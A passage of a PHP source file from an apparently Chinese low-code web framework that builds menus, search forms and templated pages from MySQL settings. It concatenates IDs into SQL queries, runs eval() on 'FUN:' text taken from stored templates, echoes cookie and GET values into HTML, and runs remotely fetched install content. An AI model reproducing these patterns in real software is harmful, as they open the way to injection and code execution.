        $tmp2inner=str_replace("[myclass]","[myclass".$p.".".$q.".".$r."]",$tmp2inner);
        $tmp2inner=str_replace("[mydescrib]","[mydescrib".$p.".".$q.".".$r."]",$tmp2inner);
        $tmp2inner=str_replace("[mytxt]","[mytxt".$p.".".$q.".".$r."]",$tmp2inner);
        $tmp2inner=str_replace("[mylevel]","[mylevel".$p.".".$q.".".$r."]",$tmp2inner);
        $tmp2inner=str_replace("[3linner]","[3linner".$p.".".$q.".".$r."]",$tmp2inner);
        $tmp3inner="";
        if (strpos($lv3txt,")3")>0){         
         $ptfrm3=explode(")3",$lv3txt);
         $totlv3=count($ptfrm3);        
         for ($s=0;$s<$totlv3-1;$s++){ //lv2 ,1分两层就是3层都够了
          $lv4txt=hou("x".$ptfrm3[$p],"d(");
          $tmlev=4;
          $tmp3inner=$tmp3inner.$lev4;
          $tmp3inner=str_replace("[myclick]","[myclick".$p.".".$q.".".$r.".".$s."]",$tmp3inner);
          $tmp3inner=str_replace("[myid]","[myid".$p.".".$q.".".$r.".".$s."]",$tmp3inner);
          $tmp3inner=str_replace("[mytype]","[mytype".$p.".".$q.".".$r.".".$s."]",$tmp3inner);
          $tmp3inner=str_replace("[myname]","[myname".$p.".".$q.".".$r.".".$s."]",$tmp3inner);
          $tmp3inner=str_replace("[myurl]","[myurl".$p.".".$q.".".$r.".".$s."]",$tmp3inner);
          $tmp3inner=str_replace("[myclass]","[myclass".$p.".".$q.".".$r.".".$s."]",$tmp3inner);
           $tmp3inner=str_replace("[mydescrib]","[mydescrib".$p.".".$q.".".$r.".".$s."]",$tmp3inner);
          $tmp3inner=str_replace("[mytxt]","[mytxt".$p.".".$q.".".$r.".".$s."]",$tmp3inner);
          $tmp3inner=str_replace("[mylevel]","[mylevel".$p.".".$q.".".$r.".".$s."]",$tmp3inner);
         };//for 
        };//if )3
         $tmp2inner=str_replace("[3linner".$p.".".$q.".".$r."]",$tmp3inner,$tmp2inner);
       };//for

     };//if )2
       $tmp1inner=str_replace("[2linner".$p.".".$q."]",$tmp2inner,$tmp1inner);
    };//for

     //  echo "tmp1inner=".$tmp1inner;
   };//if )1
       $fmmntxt=str_replace("[1linner".$p."]",$tmp1inner,$fmmntxt);
  };//for
};// strpos(")0")>0
//

$tmpdes=explode("#/#",$exptxt);
$tottmp=count($tmpdes);
 $mntitle="";
 for ($k=0;$k<$tottmp-1;$k++){
  $tmpk=qian($tmpdes[$k],":");
  $tmpv=hou($tmpdes[$k],":");
  $fmmntxt=str_replace("[".$tmpk."]",$tmpv,$fmmntxt);
  if ($tmpk=="mntitle" or $tmpk=="mntxt"){
    $mntitle=$tmpv;
  }
 };//从头替换;
  $mndata=str_replace("[menudata]",$fmmntxt,$lelsur);
  $mndata=str_replace("[menutitle]",$mntitle,$mndata);
  $mndata=str_replace("[menutxt]",$mntitle,$mndata);
 return $mndata;
}
//上面的是目录替换不要把下面的弄混
function glv(){
  return glu();
}
//--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
function tinyhtml(){
  $h='<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <title>{title}</title>
         {cssfile}
         {jsfile}
         <script type="text/javascript" src="/DNA/EXF/sysbase/sysjs.js"></script>
         <script type="text/javascript" src="/DNA/EXF/sysbase/jquery.min.js"></script>         
         {stylex}
</head>
  {bodyx}
  {scriptx}
</html>
';
  return $h;
}
function combinehtml($fathercode=array(),$soncode=array(),$entermark){
  $comcode=array();
  $comcode["stylex"]=tostring($fathercode["stylex"]).tostring($soncode["stylex"]);
  $comcode["scriptx"]=tostring($fathercode["scriptx"]).tostring($soncode["scriptx"]);
  $comcode["cssfiles"]=tostring($fathercode["cssfiles"]).tostring($soncode["cssfiles"]);
  $comcode["jsfiles"]=tostring($fathercode["jsfiles"]).tostring($soncode["jsfiles"]);
  $comcode["html"]=str_replace($entermark,tostring($soncode["html"]),$tostring($fathercode["html"]));
  return $comcode;
}
function plotpage($plmkid){
  //从某点开始更新，以下的不更新，从该点开始及以上都更新，减少更新成本。
  return "";
}
function unitpage($pgid){
  //首先获取页面id根据树结构往下逐次生成 干脆把srdhtml 改成从html开始的这样就完整了，干嘛非得写在变量里，包含的不仅有下级单元页面，也可以是方法[FUN:anyjs("sadf",$subx)]  执行完返回$subx["scriptx"] $subx["jsscriptx"] $subhtml等等
  return "";
}

function combineanycss($expstr,$comcode=array()){  
  $partexp=explode("/",$expstr);//这里都是页面级别的，不是UNIT级别的
  $totpe=count($partexp);
  $comcode["stylex"]="";
  $comcode["scriptx"]="";
  $comcode["cssfiles"]="";
  $comcode["jsfiles"]="";
  $comcode["html"]="";
  for ($z=0;$z<$totpe;$z++){
    $cssmark=qian($partexp[$z],":");
    $cssid=hou($partexp[$z],":");
    switch ($cssmark){
      case "shortid":
      $conn=mysql_connect(gl(),glu(),glp());
       $xrst=selecteds($conn,glb(),"select stylex,scriptx,cssfiles,jsfiles from coode_shortcss where shortid='".$cssid."'","utf8","");
       $comcode["stylex"]=$comcode["stylex"].tostring(anyvalue($xrst,"stylex",0));
       $comcode["scriptx"]=$comcode["scriptx"].tostring(anyvalue($xrst,"scriptx",0));
       $comcode["cssfiles"]=$comcode["cssfiles"].";".tostring(anyvalue($xrst,"cssfiles",0));
       $comcode["jsfiles"]=$comcode["jsfiles"].";".tostring(anyvalue($xrst,"jsfiles",0));
      break;
      case "caseid":
      $conn=mysql_connect(gl(),glu(),glp());
       $xrst=selecteds($conn,glb(),"select stylex,scriptx,cssfiles,jsfiles from coode_caseform where cfid='".$cssid."'","utf8","");
       $comcode["stylex"]=$comcode["stylex"].tostring(anyvalue($xrst,"stylex",0));
       $comcode["scriptx"]=$comcode["scriptx"].tostring(anyvalue($xrst,"scriptx",0));
       $comcode["cssfiles"]=$comcode["cssfiles"].";".tostring(anyvalue($xrst,"cssfiles",0));
       $comcode["jsfiles"]=$comcode["jsfiles"].";".tostring(anyvalue($xrst,"jsfiles",0));
      break;
      case "pageid":
      $conn=mysql_connect(gl(),glu(),glp());
       $xrst=selecteds($conn,glb(),"select stylex,scriptx,cssfiles,jsfiles,srdhtml from coode_compage where pageid='".$cssid."'","utf8","");
       $comcode["stylex"]=$comcode["stylex"].tostring(anyvalue($xrst,"stylex",0));
       $comcode["scriptx"]=$comcode["scriptx"].tostring(anyvalue($xrst,"scriptx",0));
       $comcode["cssfiles"]=$comcode["cssfiles"].";".tostring(anyvalue($xrst,"cssfiles",0));
       $comcode["jsfiles"]=$comcode["jsfiles"].";".tostring(anyvalue($xrst,"jsfiles",0));
       
      break;
      case "cssmkid":
      $conn=mysql_connect(gl(),glu(),glp());
       $xrst=selecteds($conn,glb(),"select stylex,scriptx,cssfiles,jsfiles from coode_casehtml where cssmark='".$cssid."'","utf8","");
       $comcode["stylex"]=$comcode["stylex"].tostring(anyvalue($xrst,"stylex",0));
       $comcode["scriptx"]=$comcode["scriptx"].tostring(anyvalue($xrst,"scriptx",0));
       $comcode["cssfiles"]=$comcode["cssfiles"].";".tostring(anyvalue($xrst,"cssfiles",0));
       $comcode["jsfiles"]=$comcode["jsfiles"].";".tostring(anyvalue($xrst,"jsfiles",0));      
      break;
      default:        
    }
  };
  return $comcode;
}
function supersearch($tbnmx,$kies){
  $conn=mysql_connect(gl(),glu(),glp());
  $allkeyx=selectedx($conn,glb(),"select DATA_TYPE,keytitle,COLUMN_NAME,clstxt,dxtype from coode_keydetailx where TABLE_NAME='".$tbnmx."' and '".str_replace("SNO,","",$kies)."' like concat('%',COLUMN_NAME,'%')","utf8","");
  $tot=countresult($allkeyx);
  $fmlix="";
  $fmkix="";
  $tmfx='<script>
     $(function() {
       layui.use(\'laydate\', function() {
       var laydate = layui.laydate;   
      //执行一个laydate实例
      laydate.render({
       elem: \'#qa_[keyid][N]\' //指定元素
      });
      laydate.render({
       elem: \'#qb_[keyid][N]\' //指定元素
      });
     });
   })
</script>';  
for ($i=0;$i<$tot;$i++){
  $fmkix=$fmkix.anyvalue($allkeyx,"COLUMN_NAME",$i).":".anyvalue($allkeyx,"DATA_TYPE",$i)."/";
                if (anyvalue($allkeyx,"clstxt",$i)!=""){
                $newonex=anyvalue($allkeyx,"clstxt",$i);
                if (strpos($newonex,"key-")>0){
                   $hk=qian(hou($newonex,"key-"),"]");
                   $newonex="";
                 }else{
                    $newonex=str_replace("[","",$newonex);
                    $newonex=str_replace("]","",$newonex);
                    $newonex=str_replace("{","",$newonex);
                    $newonex=str_replace("}","",$newonex);
                   if (strpos("--".$newonex,"key")>0 ){
                      if (strpos($newonex,",")>0){
                       $ptnewo=explode(",",$newonex);
                       $totpn=count($ptnewo);
                       $fmmaq="";
                       $fmmah="";
                       for($zm=0;$zm<$totpn-1;$zm++){
                         $bknw=anyshort($ptnewo[$zm],"","");
                         $fmmaq=$fmmaq.qian($bknw,"|").",";
                         $fmmah=$fmmah.hou($bknw,"|").",";
                       }
                       $bknw=anyshort($ptnewo[$totpn-1],"","");
                       $fmmaq=$fmmaq.qian($bknw,"|");
                       $fmmah=$fmmah.hou($bknw,"|");
                       $newonex=$fmmaq."|".$fmmah;
                     }else{//发现有多个取值
                       $newonex=anyshort($newonex,"","");
                     }                    
                   };
                 };
                };
  switch (anyvalue($allkeyx,"DATA_TYPE",$i)){
   case "tinyint":      
      if (anyvalue($allkeyx,"keytitle",$i)!=""){
        if (anyvalue($allkeyx,"clstxt",$i)!=""){
         $tmpkx=anyvalue($allkeyx,"keytitle",$i).":".formselect(qian($newonex,"|"),hou($newonex,"|"),"","q_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]","","");
        }else{
         $tmpkx=anyvalue($allkeyx,"keytitle",$i).":<br><input id=\"qa_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"8\">--<input id=\"qb_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"8\">";
        }
      }else{
        if (anyvalue($allkeyx,"clstxt",$i)!=""){
         $tmpkx=anyvalue($allkeyx,"COLUMN_NAME",$i).":".formselect(qian($newonex,"|"),hou($newonex,"|"),"","q_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]","","");
        }else{
         $tmpkx=anyvalue($allkeyx,"COLUMN_NAME",$i).":<br><input id=\"qa_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"8\">--<input id=\"qb_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"8\">";
        } 
      };
    break;
    case "int":
      if (anyvalue($allkeyx,"keytitle",$i)!=""){
        if (anyvalue($allkeyx,"clstxt",$i)!=""){         
         $tmpkx=anyvalue($allkeyx,"keytitle",$i).":".formselect(qian($newonex,"|"),hou($newonex,"|"),"","q_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]","","");
        }else{
         $tmpkx=anyvalue($allkeyx,"keytitle",$i).":<br><input id=\"qa_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"8\">--<input id=\"qb_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"8\">";
        }
      }else{
        if (anyvalue($allkeyx,"clstxt",$i)!=""){
         $tmpkx=anyvalue($allkeyx,"COLUMN_NAME",$i).":".formselect(qian($newonex,"|"),hou($newonex,"|"),"","q_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]","","");
        }else{
         $tmpkx=anyvalue($allkeyx,"COLUMN_NAME",$i).":<br><input id=\"qa_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"8\">--<input id=\"qb_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"8\">";
        }
      };
    break;
    case "date":
      if (anyvalue($allkeyx,"keytitle",$i)!=""){
         $tmpkx=anyvalue($allkeyx,"keytitle",$i).":<br><input id=\"qa_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"10\">-<input id=\"qb_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"10\">".str_replace("[keyid]",anyvalue($allkeyx,"COLUMN_NAME",$i),$tmfx);
      }else{
        $tmpkx=anyvalue($allkeyx,"COLUMN_NAME",$i).":<br><input id=\"qa_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"10\">-<input id=\"qb_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"10\">".str_replace("[keyid]",anyvalue($allkeyx,"COLUMN_NAME",$i),$tmfx);
      };
    break;
    case "datetime":
      if (anyvalue($allkeyx,"keytitle",$i)!=""){
         $tmpkx=anyvalue($allkeyx,"keytitle",$i).":<br><input id=\"qa_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"10\">-<input id=\"qb_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"10\">".str_replace("[keyid]",anyvalue($allkeyx,"COLUMN_NAME",$i),$tmfx);
      }else{
        $tmpkx=anyvalue($allkeyx,"COLUMN_NAME",$i).":<br><input id=\"qa_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"10\">-<input id=\"qb_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"10\">".str_replace("[keyid]",anyvalue($allkeyx,"COLUMN_NAME",$i),$tmfx);
      };
    break;
    case "varchar":
      if (anyvalue($allkeyx,"keytitle",$i)!=""){
         if (anyvalue($allkeyx,"clstxt",$i)!=""){
           $tmpkx=anyvalue($allkeyx,"keytitle",$i).":".formselect(qian($newonex,"|"),hou($newonex,"|"),"","q_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]","","");
         }else{
           $tmpkx=anyvalue($allkeyx,"keytitle",$i).":<input id=\"q_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" >";
         }
      }else{
        if (anyvalue($allkeyx,"clstxt",$i)!=""){
         $tmpkx=anyvalue($allkeyx,"COLUMN_NAME",$i).":".formselect(qian($newonex,"|"),hou($newonex,"|"),"","q_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]","","");
        }else{
         $tmpkx=anyvalue($allkeyx,"COLUMN_NAME",$i).":<input id=\"q_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" >";
        }
      };      
    break;
    case "text":
      if (anyvalue($allkeyx,"keytitle",$i)!=""){
         $tmpkx=anyvalue($allkeyx,"keytitle",$i).":<input id=\"q_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" >";
      }else{
        $tmpkx=anyvalue($allkeyx,"COLUMN_NAME",$i).":<input id=\"q_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" >";
      };
    break;
    case "decimal":
      if (anyvalue($allkeyx,"keytitle",$i)!=""){
         $tmpkx=anyvalue($allkeyx,"keytitle",$i).":<input id=\"qa_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"4\">--<input id=\"qb_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"4\">";
      }else{
        $tmpkx=anyvalue($allkeyx,"COLUMN_NAME",$i).":<input id=\"qa_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"4\">--<input id=\"qb_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"4\">";
      };
    break;
    case "float":
      if (anyvalue($allkeyx,"keytitle",$i)!=""){
         $tmpkx=anyvalue($allkeyx,"keytitle",$i).":<input id=\"qa_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"4\">--<input id=\"qb_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"4\">";
      }else{
        $tmpkx=anyvalue($allkeyx,"COLUMN_NAME",$i).":<input id=\"qa_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"4\">--<input id=\"qb_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"4\">";
      };
    break;
    default:
      if (anyvalue($allkeyx,"keytitle",$i)!=""){
         $tmpkx=anyvalue($allkeyx,"keytitle",$i).":<input id=\"q_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" >";
      }else{
        $tmpkx=anyvalue($allkeyx,"COLUMN_NAME",$i).":<input id=\"q_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" >";
      };      
  }//switch
  $fmlix=$fmlix."<li>".$tmpkx."</li>\r\n";
}//for
$scbtn='<div class="layui-input-inline" style="margin-left:5px;">
         <a class="layui-btn" onclick="supersearch(\''.qian(_get("stid"),"-").'\',0)">第[N]页-超级检索</a>
       </div>';  
$uldemo="<div class=\"tab\" id=\"d[N]\"><center>".$scbtn."</center>\r\n<ul>\r\n".$fmlix."</ul>\r\n</div>\r\n";
$ulhead=' <div class="htabs"><center>
  <a href="javascript:diyi();" id="di1" onclick="diyi()">①&nbsp;</a>
  <a href="javascript:dier();" id="di2" onclick="dier()">②&nbsp;</a>
  <a href="javascript:disan();" id="di3"  onclick="disan()">③&nbsp;</a>
  <a href="javascript:disi();" id="di4" onclick="disi()">④&nbsp;</a>
  <a href="javascript:diwu();" id="di5" onclick="diwu()">⑤&nbsp;</a>
  <a href="javascript:diliu();" id="di6"  onclick="diliu()">⑥&nbsp;</a>
  </center>
 </div>';
$fmtabx="";
for ($j=1;$j<7;$j++){
  $fmtabx=$fmtabx.str_replace("[N]",$j,$uldemo);
}
$ulbody="<div class=\"tabs\" style=\"margin-top:20px\">".$fmtabx."</div>";
$newsdata="<div  id=\"supers\" skey=\"".$fmkix."\">".$ulhead.$ulbody."</div>";
  return $newsdata;
}
 function instance($mstr){
   $mstr=str_replace("{","<",$mstr);
   $mstr=str_replace("}",">",$mstr);
   $mstr=str_replace("[","{",$mstr);
   $mstr=str_replace("]","}",$mstr);
   return $mstr;
 }
 function exchangeunit($trow=array(),$casehtml){   
       if ($trow["ktitle"]==""){
         $casehtml=str_replace("{label}",$trow["key"],$casehtml);
       }else{
         $casehtml=str_replace("{label}",$trow["ktitle"],$casehtml);
       }
       $casehtml=str_replace("{key0}",$trow["key0"],$casehtml);
       $casehtml=str_replace("{key}",$trow["key"],$casehtml);
       $casehtml=str_replace("{SNO}",$trow["thissno"],$casehtml);
       $casehtml=str_replace("{keys}",$trow["showkeys"],$casehtml);
       $casehtml=str_replace("{table}",$trow["tablename"],$casehtml);
       $casehtml=str_replace("{stid}",$trow["shortid"],$casehtml);
       $casehtml=str_replace("{dxtype}",$trow["dxtype"],$casehtml);
       $casehtml=str_replace("{date}",date("Y-m-d"),$casehtml);
       $casehtml=str_replace("{now}",date("Y-m-d H:i:s"),$casehtml);
       $casehtml=str_replace("{anymark}",date("YmdHis").getRandChar(6),$casehtml);
       $casehtml=str_replace("{dspl}",$trow["dsplhtml"],$casehtml);
       $casehtml=str_replace("{rdol}",$trow["rdolhtml"],$casehtml);
       $casehtml=str_replace("{OLMK}",$trow["thisolmk"],$casehtml);
       $casehtml=str_replace("{thisid}","ipt".$trow["key"].$trow["thissno"],$casehtml);
       $casehtml=str_replace("{thiskey}",$trow["key"],$casehtml);
       $casehtml=str_replace("{thistable}",$trow["tablename"],$casehtml);
       $casehtml=str_replace("{thissno}",$trow["thissno"],$casehtml);
       $casehtml=str_replace("{tmpks}",$trow["key"].$trow["thissno"],$casehtml);
       $casehtml=str_replace("{thisshort}",$trow["shortid"],$casehtml);            
       $casehtml=str_replace("{siteurl}",glw(),$casehtml);  
       $casehtml=str_replace("{rip}",getip(),$casehtml);
       $casehtml=str_replace("{uid}",$_COOKIE["uid"],$casehtml);
       $casehtml=str_replace("{gid}",$_COOKIE["gid"],$casehtml);
       $casehtml=str_replace("{cid}",$_COOKIE["cid"],$casehtml);
       $casehtml=str_replace("{appid}",$_GET["appid"],$casehtml);
       $casehtml=str_replace("{defaultbase}",glb(),$casehtml);
       $casehtml=str_replace("{defaultip}",gl(),$casehtml);
       $casehtml=str_replace("{value}",$trow["value"],$casehtml); 
       $casehtml=str_replace("{hvalue}",$trow["hvalue"],$casehtml); 
       $casehtml=str_replace("{ti}",$trow["ti"],$casehtml); 
       $casehtml=str_replace("{tj}",$trow["tj"],$casehtml); 
       $casehtml=str_replace("{acthtm}",$trow["acthtm"],$casehtml);
       $casehtml=str_replace("{atnhtm}",$trow["atnhtm"],$casehtml);
       $casehtml=str_replace("{dspl}",$trow["dsplhtml"],$casehtml);
       $casehtml=str_replace("{rdol}",$trow["rdolhtml"],$casehtml);
    if (strpos("XY".$casehtml,"FUN:")>0){
      $funxy=hou($casehtml,"FUN:");
      eval($funxy);
    //  echo $funxy;
      $casehtml=$funvalue;
    };
      //以下为值包裹解析
   return $casehtml;
 }

function shortinfo($shortid,$stbase=array()){
  $conn=mysql_connect(gl(),glu(),glp());
  $strst=selecteds($conn,glb(),"select tablename,caseid,showkeys,beforeview,cdt,orddt,lang,dttp,hframe,tabdemo,headdemo,searchdemo,pagedemo,diycode,diytop,diybottom,addpage,addtitle,shorttitle,updatepage,allkillbtn,detailpage,detailid,additemx,newbutton,topbtn,bottombtn,ctraw,obtn,vbtn,xbtn,oprtx,headx,tbhd,dtx,sps,keyitem,STCODE,datahost from coode_shortdata where shortid='".$shortid."'","utf8","");  
  $stbase["shortid"]=$shortid;
  if (anyvalue($strst,"datahost",0)!="" and anyvalue($strst,"tablename",0)!="localhost"){
      $comm["host"]=anyvalue($strst,"tablename",0);
      $strst=selecteds($comm,glb(),"select tablename,caseid,showkeys,cdt,orddt,lang,dttp,hframe,tabdemo,headdemo,searchdemo,pagedemo,diycode,diytop,diyright,diybottom,addpage,addtitle,shorttitle,updatepage,allkillbtn,detailpage,additemx,newbutton,topbtn,bottombtn,ctraw,obtn,vbtn,xbtn,oprtx,headx,tbhd,dtx,sps,keyitem,STCODE,datahost from coode_shortdata where shortid='".$shortid."'","utf8","");  
  }
  $stbase["tablename"]=tostring(anyvalue($strst,"tablename",0));
  $stbase["showkeys"]=tostring(anyvalue($strst,"showkeys",0));
  if (strpos("XX".$stbase["showkeys"],"SNO,")>0){
    if (substr($stbase["showkeys"],0,3)!="SNO"){
      $stbase["showkeys"]="SNO,".str_replace("SNO,","",$stbase["showkeys"]);
    };
  }else{
    $stbase["showkeys"]="SNO,".$stbase["showkeys"];
  }
  if (strpos("XX".$stbase["showkeys"],"OLMK")>0){
  }else{
    $stbase["showkeys"]=$stbase["showkeys"].",OLMK";
  }
  $stbase["cdt"]=tostring(anyvalue($strst,"cdt",0));
  $stbase["orddt"]=tostring(anyvalue($strst,"orddt",0));
  $stbase["beforeview"]=tostring(anyvalue($strst,"beforeview",0));
  $stbase["caseid"]=tostring(anyvalue($strst,"caseid",0));
  $stbase["pageid"]=tostring(anyvalue($strst,"lang",0));
  $stbase["dttp"]=tostring(anyvalue($strst,"dttp",0));  
  $stbase["addpage"]=tostring(anyvalue($strst,"addpage",0));
  $stbase["addtitle"]=tostring(anyvalue($strst,"addtitle",0));
  $stbase["shorttitle"]=tostring(anyvalue($strst,"shorttitle",0));
  $stbase["updatepage"]=tostring(anyvalue($strst,"updatepage",0));
  $stbase["detailpage"]=tostring(anyvalue($strst,"detailpage",0));
  $stbase["keyitem"]=tostring(anyvalue($strst,"keyitem",0));
  
  $stbase["hframe"]=tostring(anyvalue($strst,"hframe",0));
  $stbase["tabdemo"]=tostring(anyvalue($strst,"tabdemo",0));
  $stbase["headdemo"]=tostring(anyvalue($strst,"headdemo",0));
  $stbase["searchdemo"]=tostring(anyvalue($strst,"searchdemo",0));
  $stbase["pagedemo"]=tostring(anyvalue($strst,"pagedemo",0));
  
  $stbase["STCODE"]=tostring(anyvalue($strst,"STCODE",0));
  $stbase["additemx"]=anyvalue($strst,"additemx",0)*1;
  $stbase["newbutton"]=anyvalue($strst,"newbutton",0)*1;
  $stbase["obtn"]=anyvalue($strst,"obtn",0)*1;
  $stbase["vbtn"]=anyvalue($strst,"vbtn",0)*1;
  $stbase["xbtn"]=anyvalue($strst,"xbtn",0)*1;
  $stbase["oprtx"]=anyvalue($strst,"oprtx",0)*1;
  if ($stbase["oprtx"]*1>0){
    if (strpos("XX".$stbase["showkeys"],"OPRT")>0){
    }else{
     $stbase["showkeys"]=$stbase["showkeys"].",OPRT";
    }
  }
  $stbase["diycode"]=instance(tostring(anyvalue($strst,"diycode",0)));
  $stbase["headx"]=instance(tostring(anyvalue($strst,"headx",0)));
  $stbase["diytop"]=instance(tostring(anyvalue($strst,"diytop",0)));
  $stbase["diyright"]=instance(tostring(anyvalue($strst,"diyright",0)));
  $stbase["diybottom"]=instance(tostring(anyvalue($strst,"diybottom",0)));
  $stbase["lang"]=tostring(anyvalue($strst,"lang",0));
  $stbase["detailid"]=tostring(anyvalue($strst,"detailid",0));
  
  $stbase["topbtn"]=tostring(anyvalue($strst,"topbtn",0))*1;
  $stbase["bottombtn"]=tostring(anyvalue($strst,"bottombtn",0))*1;
  $stbase["tbhd"]=tostring(anyvalue($strst,"tbhd",0))*1;
  $stbase["sps"]=tostring(anyvalue($strst,"sps",0))*1;
  $stbase["dtx"]=tostring(anyvalue($strst,"dtx",0))*1;
  
  $stbase["ctraw"]=tostring(anyvalue($strst,"ctraw",0))*1;
  $stbase["allkillbtn"]=tostring(anyvalue($strst,"allkillbtn",0))*1;
  return $stbase;
}//keyarea 里面的字段是禁止看的字段，这样比较好操作。
function htmlcss($cssmk,$chcss=array()){
      $conn=mysql_connect(gl(),glu(),glp()); 
      $mkrst=selecteds($conn,glb(),"select casesurd,casehtml from coode_casehtml where cssmark='".$cssmk."'","utf8","");
      $chcss["csurd"]=instance(tostring(anyvalue($mkrst,"casesurd",0)));
      $chcss["chtml"]=instance(tostring(anyvalue($mkrst,"casehtml",0)));
      $chcss["jsfiles"]=tostring(anyvalue($mkrst,"jsfiles",0));
      $chcss["cssfiles"]=tostring(anyvalue($mkrst,"cssfiles",0));
      $chcss["scriptx"]=tostring(anyvalue($mkrst,"scriptx",0));
      $chcss["stylex"]=tostring(anyvalue($mkrst,"stylex",0));
   return $chcss;
}
function formatbase($fmtid,$fmtbase=array()){
   $conn=mysql_connect(gl(),glu(),glp());
   $fmtrst=selecteds($conn,glb(),"select jsonid,jsontitle,keytpexc,datefmt,dttmfmt,dkeyexc,keyitem,jsonsrd,jsonitem from coode_dataformat where jsonid='".$fmtid."'","utf8","");    
   $totx=countresult($fmtrst);
   if ($totx>0){
     $fmtbase["jsonid"]=anyvalue($fmtrst,"jsonid",0);
     $fmtbase["jsontitle"]=anyvalue($fmtrst,"jsontitle",0);
     $fmtbase["keytpexc"]=tostring(anyvalue($fmtrst,"keytpexc",0));
     $fmtbase["datefmt"]=anyvalue($fmtrst,"datefmt",0);
     $fmtbase["dttmfmt"]=anyvalue($fmtrst,"dttmfmt",0);
     $fmtbase["dkeyexc"]=anyvalue($fmtrst,"dkeyexc",0);
     $fmtbase["keyitem"]=tostring(anyvalue($fmtrst,"keyitem",0));
     $fmtbase["jsonsrd"]=tostring(anyvalue($fmtrst,"jsonsrd",0));
     $fmtbase["jsonitem"]=tostring(anyvalue($fmtrst,"jsonitem",0));
   }else{
     $getfmt=file_get_contents("http://".glm()."/DNA/EXF/anyfuns.php?fid=getdatafmt");
     $z=runinstall("","",$getfmt,onlymark());
     $conn=mysql_connect(gl(),glu(),glp());
     $fmtrst=selecteds($conn,glb(),"select jsonid,jsontitle,keytpexc,datefmt,dttmfmt,dkeyexc,keyitem,jsonsrd,jsonitem from coode_dataformat where jsonid='".$fmtid."'","utf8","");    
     $totx=countresult($fmtrst);
     $fmtbase["jsonid"]=$fmtid;
     $fmtbase["jsontitle"]="";
     $fmtbase["keytpexc"]="";
     $fmtbase["datefmt"]="";
     $fmtbase["dttmfmt"]="";
     $fmtbase["dkeyexc"]="";
     $fmtbase["keyitem"]="";
     $fmtbase["jsonsrd"]="";
     $fmtbase["jsonitem"]="";
   }
  return $fmtbase;
}
function makejson($fmtb=array(),$kinfo=array(array()),$jstxt,$skeys,$totrcd){
  //{"tbname":"[tbnm]","cantkies":"[ckies]","keys":"[tbkies]","ktps":"[ktps]"
  $jsrd=$fmtb["jsonsrd"];
  $kdemo=$fmtb["keyitem"];
  $ddemo=$fmtb["datefmt"];
  $dttmdemo=$fmtb["dttmfmt"];
  $fmktps="";  
  $fmtps="";
  $extkx="";
  for ($p=0;$p<$kinfo["COLUMN"]["COUNT"];$p++){
    if (strpos(",,".$skeys.",",",".$kinfo["COLUMN"][$p].",")>0){
      if ($kinfo[$keyinfo["COLUMN"][$p]]["COLUMN_TPNM"]=="date" or $kinfo[$keyinfo["COLUMN"][$p]]["COLUMN_TPNM"]=="datetime"){
        if ($kinfo[$kinfo["COLUMN"][$p]]["COLUMN_TPNM"]=="date"){
          $tdemo=$ddemo;
        }else{          
          $tdemo=$dttmdemo;
        }
      }else{
         $tdemo=$kdemo;
      }      
         $tdemo=str_replace("[key]",$kinfo["COLUMN"][$p],$tdemo);
         $tdemo=str_replace("[keytp]",$kinfo[$kinfo["COLUMN"][$p]]["COLUMN_TPNM"],$tdemo);
         $tdemo=str_replace("[keylen]",$kinfo[$kinfo["COLUMN"][$p]]["COLUMN_TPLEN"],$tdemo);
         $tdemo=str_replace("[keytt]",$kinfo[$kinfo["COLUMN"][$p]]["COLUMN_TITLE"],$tdemo);
         $tdemo=str_replace("[cable]",$kinfo[$kinfo["COLUMN"][$p]]["COLUMN_CANGE"],$tdemo);
         $tdemo=str_replace("[clstxt]",$kinfo[$kinfo["COLUMN"][$p]]["COLUMN_CLSTXT"],$tdemo);
         $tdemo=str_replace("[jshow]",$kinfo[$kinfo["COLUMN"][$p]]["COLUMN_JSHOW"],$tdemo);
         $tdemo=str_replace("[jpost]",$kinfo[$kinfo["COLUMN"][$p]]["COLUMN_JPOST"],$tdemo);
